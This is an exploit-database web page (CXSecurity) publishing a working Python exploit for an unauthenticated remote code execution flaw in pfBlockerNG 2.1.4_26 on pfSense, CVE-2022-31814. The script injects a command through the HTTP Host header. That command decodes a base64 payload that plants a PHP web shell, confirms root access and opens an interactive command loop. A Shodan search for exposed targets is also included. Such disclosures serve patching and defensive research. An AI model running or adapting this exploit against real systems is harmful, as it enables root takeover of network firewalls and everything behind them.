---
title: pfBlockerNG 2.1.4_26 Remote Code Execution
url: https://cxsecurity.com/issue/WLB-2023020048
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-02-28
fetch_date: 2025-10-04T08:12:11.641863
---

# pfBlockerNG 2.1.4_26 Remote Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **pfBlockerNG 2.1.4\_26 Remote Code Execution** **2023.02.27**  Credit:  **[IHTeam](https://cxsecurity.com/author/IHTeam/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2022-31814](https://cxsecurity.com/cveshow/CVE-2022-31814/ "Click to see CVE-2022-31814")**  CWE: **N/A** | |

# Exploit Title: pfBlockerNG 2.1.4\_26 - Remote Code Execution (RCE)
# Shodan Results: https://www.shodan.io/search?query=http.title%3A%22pfSense+-+Login%22+%22Server%3A+nginx%22+%22Set-Cookie%3A+PHPSESSID%3D%22
# Date: 5th of September 2022
# Exploit Author: IHTeam
# Vendor Homepage: https://docs.netgate.com/pfsense/en/latest/packages/pfblocker.html
# Software Link: https://github.com/pfsense/FreeBSD-ports/pull/1169
# Version: 2.1.4\_26
# Tested on: pfSense 2.6.0
# CVE : CVE-2022-31814
# Original Advisory: https://www.ihteam.net/advisory/pfblockerng-unauth-rce-vulnerability/
#!/usr/bin/env python3
import argparse
import requests
import time
import sys
import urllib.parse
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable\_warnings(InsecureRequestWarning)
parser = argparse.ArgumentParser(description="pfBlockerNG <= 2.1.4\_26 Unauth RCE")
parser.add\_argument('--url', action='store', dest='url', required=True, help="Full URL and port e.g.: https://192.168.1.111:443/")
args = parser.parse\_args()
url = args.url
shell\_filename = "system\_advanced\_control.php"
def check\_endpoint(url):
response = requests.get('%s/pfblockerng/www/index.php' % (url), verify=False)
if response.status\_code == 200:
print("[+] pfBlockerNG is installed")
else:
print("\n[-] pfBlockerNG not installed")
sys.exit()
def upload\_shell(url, shell\_filename):
payload = {"Host":"' \*; echo 'PD8kYT1mb3BlbigiL3Vzci9sb2NhbC93d3cvc3lzdGVtX2FkdmFuY2VkX2NvbnRyb2wucGhwIiwidyIpIG9yIGRpZSgpOyR0PSc8P3BocCBwcmludChwYXNzdGhydSggJF9HRVRbImMiXSkpOz8+Jztmd3JpdGUoJGEsJHQpO2ZjbG9zZSggJGEpOz8+'|python3.8 -m base64 -d | php; '"}
print("[/] Uploading shell...")
response = requests.get('%s/pfblockerng/www/index.php' % (url), headers=payload, verify=False)
time.sleep(2)
response = requests.get('%s/system\_advanced\_control.php?c=id' % (url), verify=False)
if ('uid=0(root) gid=0(wheel)' in str(response.content, 'utf-8')):
print("[+] Upload succeeded")
else:
print("\n[-] Error uploading shell. Probably patched ", response.content)
sys.exit()
def interactive\_shell(url, shell\_filename, cmd):
response = requests.get('%s/system\_advanced\_control.php?c=%s' % (url, urllib.parse.quote(cmd, safe='')), verify=False)
print(str(response.text)+"\n")
def delete\_shell(url, shell\_filename):
delcmd = "rm /usr/local/www/system\_advanced\_control.php"
response = requests.get('%s/system\_advanced\_control.php?c=%s' % (url, urllib.parse.quote(delcmd, safe='')), verify=False)
print("\n[+] Shell deleted")
check\_endpoint(url)
upload\_shell(url, shell\_filename)
try:
while True:
cmd = input("# ")
interactive\_shell(url, shell\_filename, cmd)
except:
delete\_shell(url, shell\_filename)

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023020048)

[Tweet](https://twitter.com/share)

Vote for this issue:
 1
 0

100%

0%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top